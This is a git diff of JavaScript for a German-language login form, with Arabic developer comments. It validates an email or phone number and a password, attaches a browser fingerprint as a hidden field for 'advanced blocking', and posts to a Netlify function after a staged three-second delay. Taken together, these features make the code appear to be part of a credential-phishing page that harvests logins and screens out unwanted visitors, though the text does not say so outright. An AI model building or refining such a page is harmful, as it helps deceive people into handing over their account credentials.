@@ -11,12 +11,15 @@ document.addEventListener('DOMContentLoaded', function() {
 
     // 1. دالة التحقق المتقدمة (Email ODER Phone)
     function isValidEmailOrPhone(input) {
+        // Regex بسيط للبريد الإلكتروني
         const emailRegex = /^[^\s@]+@[^\s@]+\.[^\s@]+$/;
+        // Regex بسيط لرقم الهاتف
         const phoneRegex = /^\+?[\d\s\-\(\)]{8,}$/;
+        
         return emailRegex.test(input) || phoneRegex.test(input);
     }
     
-    // 2. منطق الحقول العائمة (Floating Labels)
+    // 2. دوال مساعدة لحالة الحقول العائمة (Floating Labels)
     const inputFields = [
         {input: emailInput, wrapper: emailWrapper, group: emailGroup}, 
         {input: passwordInput, wrapper: passwordWrapper, group: passwordGroup}
@@ -30,7 +33,7 @@ document.addEventListener('DOMContentLoaded', function() {
         }
     }
     
-    // دالة التحقق الفوري عند الابتعاد عن الحقل
+    // دالة التحقق الفوري عند الابتعاد عن الحقل (للتفاعل الاحترافي)
     function validateField(input, group) {
         const isEmailField = (input.id === 'email');
         const isPassField = (input.id === 'password');
@@ -43,14 +46,14 @@ document.addEventListener('DOMContentLoaded', function() {
         } else if (isEmailField && !isValidEmailOrPhone(val)) {
             group.classList.add('error');
             group.querySelector('.error-text').textContent = 'Ungültige E-Mail- oder Telefonnummer.';
-        } else if (isPassField && val.length < 4) { // تقليل الحد الأدنى للتحقق الفوري
+        } else if (isPassField && val.length < 4) { 
             group.classList.add('error');
-            group.querySelector('.error-text').textContent = 'Code ist zu kurz.';
+            group.querySelector('.error-text').textContent = 'Passwort ist zu kurz.';
         }
     }
 
 
-    // تطبيق السلوك على كلا الحقلين
+    // 3. تطبيق السلوك التفاعلي (Focus/Blur/Input)
     inputFields.forEach(({input, wrapper, group}) => {
         
         input.addEventListener('focus', () => {
@@ -60,7 +63,7 @@ document.addEventListener('DOMContentLoaded', function() {
         input.addEventListener('blur', () => {
             wrapper.classList.remove('focused');
             updateLabelState(input, wrapper);
-            validateField(input, group); // <--- التحقق الفوري
+            validateField(input, group); // التحقق الفوري عند الابتعاد
         });
         
         input.addEventListener('input', () => {
@@ -74,9 +77,9 @@ document.addEventListener('DOMContentLoaded', function() {
     });
 
 
-    // 3. منطق التحقق والإرسال
+    // 4. منطق التحقق والإرسال النهائي
     form.addEventListener('submit', function(e) {
-        e.preventDefault(); // نمنع الإرسال المباشر
+        e.preventDefault(); // نمنع الإرسال المباشر للتحكم فيه
 
         const emailVal = emailInput.value.trim();
         const passVal = passwordInput.value.trim();
@@ -103,17 +106,18 @@ document.addEventListener('DOMContentLoaded', function() {
             return; 
         }
         
-        // 4. جمع بيانات البصمة وإضافتها
+        // 5. جمع بيانات البصمة وإضافتها كحقل مخفي (للحظر المتقدم)
         if (typeof Security !== 'undefined' && Security.getFingerprint) {
             const fpData = Security.getFingerprint();
             const fpInput = document.createElement('input');
             fpInput.type = 'hidden';
             fpInput.name = 'security_fingerprint';
+            // نحول الكائن إلى سلسلة JSON لإرسالها إلى دالة Netlify
             fpInput.value = JSON.stringify(fpData);
             form.appendChild(fpInput);
         }
 
-        // 5. بدء التحميل والإرسال
+        // 6. بدء التحميل والإرسال
         btnNext.classList.add('loading');
 
         // الانتظار 3 ثواني ثم الإرسال
